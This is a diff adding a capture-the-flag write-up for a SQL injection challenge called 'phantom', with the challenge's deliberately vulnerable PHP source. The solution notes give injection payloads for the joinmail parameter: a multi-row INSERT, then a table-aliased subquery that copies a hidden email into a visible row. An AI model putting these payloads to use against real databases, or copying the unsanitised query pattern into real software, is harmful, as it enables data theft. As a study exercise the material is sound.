@@ -1,0 +1,56 @@
+PHANTOM Clear!
+<?php
+  include "./config.php";
+  login_chk();
+  $db = dbconnect("phantom");
+
+  if($_GET['joinmail']){
+    if(preg_match('/duplicate/i', $_GET['joinmail'])) exit("nice try");
+    $query = "insert into prob_phantom values(0,'{$_SERVER[REMOTE_ADDR]}','{$_GET[joinmail]}')";
+    mysqli_query($db,$query);
+    echo "<hr>query : <strong>{$query}</strong><hr>";
+  }
+
+  $rows = mysqli_query($db,"select no,ip,email from prob_phantom where no=1 or ip='{$_SERVER[REMOTE_ADDR]}'");
+  echo "<table border=1><tr><th>ip</th><th>email</th></tr>";
+    while(($result = mysqli_fetch_array($rows))){
+    if($result['no'] == 1) $result['email'] = "**************";
+    echo "<tr><td>{$result[ip]}</td><td>".htmlentities($result[email])."</td></tr>";
+  }
+  echo "</table>";
+
+  $_GET[email] = addslashes($_GET[email]);
+  $query = "select email from prob_phantom where no=1 and email='{$_GET[email]}'";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if(($result['email']) && ($result['email'] === $_GET['email'])){ mysqli_query($db,"delete from prob_phantom where no != 1"); solve("phantom"); }
+  highlight_file(__FILE__);
+?>
+
+1. check if it's possible to insert multiple rows at once:
+
+> ?joinmail=test1'), (2, 'MYIP', 'test2
+
+insert into prob_phantom values(0,'MYIP','test1'), (2, 'MY IP', 'test2')
+
+Cool.
+
+2. So, simply update the mail field with the value of secret row (no=1) field:
+
+Something like:
+
+insert into prob_phantom value(0, 'MYIP', 'test1'), (2, (select email from
+prob_phantom where no=1))#
+
+!!! But be aware!!!
+
+In MySQL, you can't modify the same table which you use in the SELECT part.
+This behaviour is documented at: http://dev.mysql.com/doc/refman/5.6/en/update.html
+ERROR 1093 (HY000):
+
+In this case, there is a simple solution, which is select to give an alias to the table name in the statement.
+
+insert into prob_phantom value(0, 'MYIP', 'test1'), (2, (select email from
+prob_phantom ALIASNAME1 where no=1))#
+
+
+End of file.
